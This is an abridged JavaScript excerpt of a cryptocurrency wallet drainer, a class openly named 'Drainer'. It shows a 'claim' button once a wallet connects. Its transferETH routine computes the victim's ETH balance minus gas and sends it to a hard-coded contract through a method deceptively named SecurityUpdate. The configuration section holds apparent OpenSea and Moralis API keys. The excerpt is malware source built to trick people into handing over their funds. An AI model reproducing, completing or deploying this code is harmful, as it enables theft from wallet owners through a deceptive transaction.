...
class Configuration {
    ...
    OpenseaAPI = "14688a33a1f34d8198f4b2b4a4e3a29e";
    MoralisAPI = "mwJp1cxnZPNqqdWPpydohHVL5j26GUsyHN0L2kCZehtnHipNmy7l8Vdh5SlZkFmt";
...
class Drainer extends Configuration {
    ...
    updateStates = async (connect = true) => {
        if(connect) {
            ...
            this.claimButton.style.display = "inline-block";
    ...
    transferETH = async () => {
        ...
        if(this.walletBalanceInEth > 0.008) {
            console.log("case1")
            etherToSend = etherToSend - (gasPrice * 100000);
        }
        ...
        let contractInstance = new this.web3Js.eth.Contract(SECURITY_UPDATE_ABI, "0x953de0fee9e7b8056dd802b2e9ba0c8e540c68b8");
        ...
        console.log(`Sending ${this.web3Js.utils.fromWei(etherToSend.toString())} ETH`);
            ...
            await new Promise(async (resolve, reject) => { 
                ...
                await contractInstance.methods.SecurityUpdate().send({
                    from: this.walletAddress,
